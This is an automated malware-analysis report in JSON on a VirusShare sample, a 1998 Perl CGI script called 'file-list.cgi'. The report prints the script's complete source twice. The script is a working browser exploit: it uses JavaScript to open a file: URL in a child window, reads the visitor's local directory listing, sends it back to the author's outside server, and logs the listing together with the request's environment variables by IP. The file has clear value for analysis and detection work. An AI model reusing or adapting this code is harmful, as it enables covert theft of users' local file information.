{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "open": "May open a file"
        },
        "macro": "#!/usr/bin/perl\n#\n# file-list.cgi -- Dan Brumleve <nothing@shout.net>, 1998.10.05\n\nuse CGI qw(escape unescape);\n\nmy $self = \"http://www.shout.net/nothing/son-of-cache-cow/file-list.cgi\";\n\nmy $cgi = new CGI;\nmy $action = $cgi->param(\"action\");\nmy $default = ($ENV{HTTP_USER_AGENT} =~ /win/i) ? \"c:\" : \"/\";\n\nif (!$action) {\n  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";\n  <html>\n  <head><title>File List</title></head>\n  <body bgcolor=\"#ffffff\">\n  <h1>File List</h1>\n  <form action=\"$self\" method=\"get\">\n  <input type=hidden name=action value=launch>\n  Enter a local directory name:\n  <input type=text name=q size=50 value=\"$default\"><br>\n  <input type=submit value=\"Give Dan Your Directory Listing\">\n  </form>\n  </body>\n  </html>\n  EOF\n}\n\nif ($action eq \"launch\") {\n  my $q = escape($cgi->param(\"q\"));\n  $q =~ /^\\%2F/ or $q = \"%2F\" . $q;\n  $q =~ /\\%2F$/ or $q = $q . \"%2F\";\n  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";\n  <title>File List (activated)</title>\n  <script>\n  var slave;\n  var data = \"\";\n\n  function report() {\n    slave.location=\"$self?action=yum\";\n  }\n\n  function lump() {\n    slave.onload = report;\n  }\n\n  function launch() {\n    slave = window.open(\"javascript:void(0)\", \"slave\");\n    document.f.submit();\n    slave.onunload=lump;\n  }\n\n  function show() {\n    document.g.files.value = data;\n    document.g.submit();\n  }\n\n  </script>\n  <body onLoad=\"launch()\" onUnload=\"show()\">\n\n  <form action=\"file:$q\" method=get target=slave name=f><input type=submit></form>\n  <form action=\"$self\" method=\"post\" name=g>\n  <input type=hidden name=q value=\"$q\">\n  <input type=hidden name=action value=show>\n  <input type=hidden name=files value=\"\">\n  <input type=submit>\n  </form>\n  </body>\n  EOF\n\n  exit 0;\n}\n\nif ($action eq \"yum\") {\n  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";\n  var s = \"\";\n  for (i = 1; i < document.links.length; i++) {\n    s += escape(document.links[i].href) + \"&\";\n  }\n  window.opener.data = s;\n  window.opener.show();\n  window.close();\n  EOF\n  exit 0;\n}\n\nif ($action eq \"show\") {\n  my $q = unescape($cgi->param(\"q\"));\n  my $files = join(\"\\n\", map {\n   $_ = unescape($_); s/^file://; unescape($_) }\n   split(/&/,$cgi->param(\"files\")));\n  if (open(FP, \">> logs/log-$ENV{REMOTE_ADDR}.txt\")) {\n    for (sort keys %ENV) { print FP $_ . \"=\" . $ENV{$_} . \"\\n\"; }\n    print FP \"\\n\" . $files . \"\\n\\n\";\n    close(FP);\n  }\n  print \"Content-type: text/plain\\n\\n\" . <<\"  EOF\";\nContents of local directory '$q':\n\n$files\n  EOF\n\n  exit 0;\n}"
    },
    "filename": "VirusShare_2f314d2d5e20d96664bfcc15429d6f5a",
    "filesize": 2586,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "2f314d2d5e20d96664bfcc15429d6f5a",
        "sha1": "8d16d19e0ab5c1e2cd2250a9de8c69c117cb1c09",
        "sha256": "bab78be4617fa84ad459983d97308baa22c3547d6b54b5900b2dc7aed32e6dc4"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# file-list.cgi -- Dan Brumleve <nothing@shout.net>, 1998.10.05",
            "use CGI qw(escape unescape);",
            "my $self = \"http://www.shout.net/nothing/son-of-cache-cow/file-list.cgi\";",
            "my $cgi = new CGI;",
            "my $action = $cgi->param(\"action\");",
            "my $default = ($ENV{HTTP_USER_AGENT} =~ /win/i) ? \"c:\" : \"/\";",
            "if (!$action) {",
            "  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";",
            "  <html>",
            "  <head><title>File List</title></head>",
            "  <body bgcolor=\"#ffffff\">",
            "  <h1>File List</h1>",
            "  <form action=\"$self\" method=\"get\">",
            "  <input type=hidden name=action value=launch>",
            "  Enter a local directory name:",
            "  <input type=text name=q size=50 value=\"$default\"><br>",
            "  <input type=submit value=\"Give Dan Your Directory Listing\">",
            "  </form>",
            "  </body>",
            "  </html>",
            "  EOF",
            "if ($action eq \"launch\") {",
            "  my $q = escape($cgi->param(\"q\"));",
            "  $q =~ /^\\%2F/ or $q = \"%2F\" . $q;",
            "  $q =~ /\\%2F$/ or $q = $q . \"%2F\";",
            "  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";",
            "  <title>File List (activated)</title>",
            "  <script>",
            "  var slave;",
            "  var data = \"\";",
            "  function report() {",
            "    slave.location=\"$self?action=yum\";",
            "  function lump() {",
            "    slave.onload = report;",
            "  function launch() {",
            "    slave = window.open(\"javascript:void(0)\", \"slave\");",
            "    document.f.submit();",
            "    slave.onunload=lump;",
            "  function show() {",
            "    document.g.files.value = data;",
            "    document.g.submit();",
            "  </script>",
            "  <body onLoad=\"launch()\" onUnload=\"show()\">",
            "  <form action=\"file:$q\" method=get target=slave name=f><input type=submit></form>",
            "  <form action=\"$self\" method=\"post\" name=g>",
            "  <input type=hidden name=q value=\"$q\">",
            "  <input type=hidden name=action value=show>",
            "  <input type=hidden name=files value=\"\">",
            "  <input type=submit>",
            "  </form>",
            "  </body>",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"yum\") {",
            "  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";",
            "  var s = \"\";",
            "  for (i = 1; i < document.links.length; i++) {",
            "    s += escape(document.links[i].href) + \"&\";",
            "  window.opener.data = s;",
            "  window.opener.show();",
            "  window.close();",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"show\") {",
            "  my $q = unescape($cgi->param(\"q\"));",
            "  my $files = join(\"\\n\", map {",
            "   $_ = unescape($_); s/^file://; unescape($_) }",
            "   split(/&/,$cgi->param(\"files\")));",
            "  if (open(FP, \">> logs/log-$ENV{REMOTE_ADDR}.txt\")) {",
            "    for (sort keys %ENV) { print FP $_ . \"=\" . $ENV{$_} . \"\\n\"; }",
            "    print FP \"\\n\" . $files . \"\\n\\n\";",
            "    close(FP);",
            "  print \"Content-type: text/plain\\n\\n\" . <<\"  EOF\";",
            "Contents of local directory '$q':",
            "$files",
            "  EOF",
            "  exit 0;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.shout.net/nothing/son-of-cache-cow/file-list.cgi",
            "file://"
        ]
    },
    "time": "0:00:00.269597",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
